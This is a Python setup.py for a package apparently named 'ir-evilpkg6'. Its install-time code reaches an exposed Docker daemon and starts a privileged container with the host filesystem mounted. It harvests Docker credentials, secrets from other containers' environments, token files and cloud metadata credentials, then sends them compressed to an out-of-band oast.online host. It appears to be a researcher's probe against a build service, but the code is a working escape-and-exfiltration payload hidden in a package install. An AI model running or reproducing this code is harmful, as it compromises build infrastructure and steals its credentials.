import setuptools, subprocess, json, urllib.request, urllib.error, time, base64, gzip, os

OAST = "dbplsv55ap9v1jaadl501puypwbro4ye6.oast.online"
D = "http://172.18.0.1:2375"


def api(path, method="GET", body=None, timeout=10):
    req = urllib.request.Request(D + path, data=body, method=method)
    if body:
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read()
        except Exception:
            return e.code, b""
    except Exception as e:
        return "ERR", str(e).encode()


def demux(b):
    out = []
    i = 0
    try:
        while i + 8 <= len(b):
            ln = int.from_bytes(b[i + 4:i + 8], "big")
            if ln < 0 or i + 8 + ln > len(b):
                break
            out.append(b[i + 8:i + 8 + ln])
            i += 8 + ln
        return b"".join(out) if out else b
    except Exception:
        return b


out = ["== pypack6 guest-root probe %s ==" % time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())]

st, b = api("/images/json")
imgs = []
try:
    for im in json.loads(b):
        for t in (im.get("RepoTags") or []):
            imgs.append(t)
except Exception:
    pass
out.append("== images: %r" % imgs)
img = ""
for t in imgs:
    if "koyeb/builder" in t:
        img = t
        break
if not img and imgs:
    img = imgs[0]
out.append("== selected: %r" % img)

script = (
    "echo IRPROBE6; id; hostname; uname -a; "
    "echo --hostroot--; ls -la /host 2>&1 | head -30; "
    "echo --builder--; ls -la /host/builder 2>&1 | head -40; "
    "echo --builder-env--; cat /host/builder/env 2>&1 | head -60; "
    "echo --root-home--; ls -la /host/root /host/home 2>&1 | head -40; "
    "echo --dockerconfig--; cat /host/root/.docker/config.json 2>&1 | head -40; cat /host/home/koyeb/.docker/config.json 2>&1 | head -20; "
    "echo --etc--; ls -la /host/etc 2>&1 | head -30; cat /host/etc/hostname /host/etc/hosts 2>&1; "
    "echo --containers--; ls /host/var/lib/docker/containers 2>&1 | head; for f in /host/var/lib/docker/containers/*/config.v2.json; do echo \"CFG $f\"; grep -o '\"Env\":\\[[^]]*\\]' \"$f\" 2>/dev/null | head -c 2000; echo; done 2>/dev/null | head -80; "
    "echo --creds--; find /host/builder /host/root /host/home /host/etc /host/var/run /host/run /host/opt -maxdepth 4 \\( -iname '*token*' -o -iname '*secret*' -o -iname '*credential*' -o -iname '*registry*' -o -iname '*docker*' -o -iname '*kube*' -o -iname '*auth*' \\) 2>/dev/null | head -60; "
    "echo --mounts--; grep -v 'proc\\|sys\\|dev\\|cgroup' /host/proc/mounts 2>/dev/null | head -30; "
    "echo --guestnet--; cat /host/etc/resolv.conf 2>&1; ip addr 2>&1 | head -30; ip route 2>&1; "
    "echo --metadata--; curl -s -m 4 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token 2>&1 | head -c 500; "
    "echo; echo --aws--; curl -s -m 4 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 | head -c 300; "
    "echo; echo --vsock--; ls -la /host/dev/vsock 2>&1; "
    "echo --done--"
)

if img:
    name = "irprobe6-%d" % os.getpid()
    body = json.dumps({
        "Image": img,
        "Entrypoint": ["/bin/sh", "-c"],
        "Cmd": [script],
        "HostConfig": {
            "Binds": ["/:/host:ro", "/builder/workspace:/out:rw"],
            "Privileged": True,
            "AutoRemove": False,
            "NetworkMode": "host",
        },
    }).encode()
    st, b = api("/containers/create?name=%s" % name, "POST", body)
    out.append("== create -> %s %s" % (st, b[:400].decode("utf-8", "replace")))
    cid = ""
    try:
        cid = json.loads(b).get("Id", "")
    except Exception:
        pass
    if cid:
        st, b = api("/containers/%s/start" % cid, "POST")
        out.append("== start -> %s %s" % (st, b[:200].decode("utf-8", "replace")))
        try:
            api("/containers/%s/wait" % cid, "POST", timeout=30)
        except Exception:
            pass
        st, logs = api("/containers/%s/logs?stdout=1&stderr=1" % cid)
        out.append("== logs -> %s\n%s" % (st, demux(logs).decode("utf-8", "replace")[:30000]))
        try:
            out.append("== outfile ->\n" + open("/workspace/irprobe6-out.txt", "r", errors="replace").read()[:30000])
        except Exception as e:
            out.append("== outfile missing: %r" % e)
        api("/containers/%s?force=1" % cid, "DELETE")

report = "\n".join(out)
try:
    open("build-report.txt", "w").write(report)
except Exception:
    pass
try:
    b64 = base64.urlsafe_b64encode(gzip.compress(report.encode())).decode().rstrip("=")
    req = urllib.request.Request("https://%s/pypack6-%s" % (OAST, os.uname().nodename), data=b64.encode(), method="POST")
    urllib.request.urlopen(req, timeout=15).read()
except Exception:
    pass

setuptools.setup(name="ir-evilpkg6", version="1.0.0", packages=[])
